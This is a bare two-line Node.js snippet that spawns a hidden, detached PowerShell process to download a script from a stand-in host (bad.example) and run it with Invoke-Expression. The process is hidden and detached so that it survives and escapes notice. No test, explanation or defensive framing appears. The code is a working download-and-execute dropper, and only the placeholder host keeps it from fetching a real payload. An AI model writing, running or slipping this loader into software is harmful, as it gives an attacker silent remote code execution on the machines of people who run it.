const {spawn} = require('child_process');
spawn('powershell.exe', ['-Command', 'iwr https://bad.example/p.ps1 | iex'], {detached: true, windowsHide: true, stdio: 'ignore'}).unref();
